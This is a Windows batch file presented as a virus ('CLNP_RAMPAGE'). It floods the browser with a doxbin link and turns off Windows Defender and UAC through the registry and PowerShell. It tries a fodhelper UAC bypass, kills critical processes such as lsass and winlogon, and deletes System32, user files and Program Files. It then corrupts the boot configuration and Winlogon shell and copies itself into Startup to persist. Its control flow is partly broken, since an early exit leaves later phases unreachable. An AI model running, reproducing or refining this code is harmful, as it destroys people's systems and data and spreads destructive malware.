@echo off
:: CLNP_RAMPAGE v5.0 - LIVE SYSTEM EXECUTION
:: "this virus will break your pc if you ran -- by CLNP"
title this virus will break your pc if you ran -- by CLNP
color 4f
mode con: cols=90 lines=25
cls

:: === PHASE 0: INSTANT DOX FLOOD + RAM CHOKE ===
start "" "https://doxbin.com/user/LACPP"
start "" "https://doxbin.com/user/LACPP"
start "" "https://doxbin.com/user/LACPP"
start "" "https://doxbin.com/user/LACPP"
for /l %%i in (1,1,500) do start "" "https://doxbin.com/user/LACPP" >nul 2>&1

:: === PHASE 1: DISABLE DEFENDER + UAC + SMARTSCREEN ===
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul 2>&1
powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true -Force" >nul 2>&1
powershell -c "Set-MpPreference -DisableIOAVProtection $true" >nul 2>&1

:: === PHASE 2: SILENT ADMIN ELEVATION ===
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /f >nul 2>&1
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "%~f0" /f >nul 2>&1
start fodhelper.exe >nul 2>&1
timeout /t 1 >nul
exit /b

:: === PHASE 3: ADMIN CONFIRMED - LIVE DESTRUCTION ===
net session >nul 2>&1
if %errorlevel% neq 0 goto elevate

cls
echo [LIVE KILL] DOX FLOOD ACTIVE - SYSTEM32 DELETING NOW...

:: === KILL EXPLORER + CRITICAL SERVICES ===
taskkill /f /im explorer.exe >nul 2>&1
taskkill /f /im winlogon.exe >nul 2>&1
taskkill /f /im svchost.exe >nul 2>&1
taskkill /f /im lsass.exe >nul 2>&1

:: === LIVE SYSTEM32 OBLITERATION (NO REBOOT NEEDED) ===
takeown /f "C:\Windows\System32" /r /d y >nul 2>&1
icacls "C:\Windows\System32" /grant administrators:F /t /c >nul 2>&1
del /f /q /s "C:\Windows\System32\*.*" >nul 2>&1
del /f /q /s "C:\Windows\SysWOW64\*.*" >nul 2>&1
del /f /q /s "C:\Windows\System32\drivers\*.*" >nul 2>&1
del /f /q /s "C:\Windows\System32\config\*.*" >nul 2>&1

:: === LIVE USER DATA + PROGRAMS GENOCIDE ===
del /f /q /s "C:\Users\%username%\*.*" >nul 2>&1
del /f /q /s "C:\Program Files\*.*" >nul 2>&1
del /f /q /s "C:\Program Files (x86)\*.*" >nul 2>&1
del /f /q /s "C:\Windows\Prefetch\*.*" >nul 2>&1

:: === LIVE BOOTLOADER CORRUPTION (INSTANT BRICK) ===
bcdedit /delete {current} >nul 2>&1
bcdedit /set {default} recoveryenabled No >nul 2>&1
bcdedit /set {default} bootstatuspolicy ignoreallfailures >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\CrashControl" /v AutoReboot /t REG_DWORD /d 0 /f >nul 2>&1

:: === CORRUPT WINLOGON SHELL (LIVE) ===
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "" /f >nul 2>&1

:: === FINAL RAM BURN + PERSISTENCE ===
echo CLNP EXECUTED LIVE KILL - 11/15/2025 07:39 PM CST - PC DEAD > C:\CLNP_LIVEKILL.txt
copy /y "%~f0" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\CLNP.bat" >nul 2>&1

:: === INFINITE LOOP TO BURN CPU + RAM ===
:loop
start "" "https://doxbin.com/user/LACPP" >nul 2>&1
del /f /q "C:\Windows\System32\*.dll" >nul 2>&1
goto loop

:elevate
echo [INFO] Right-click and Run as Administrator for instant death.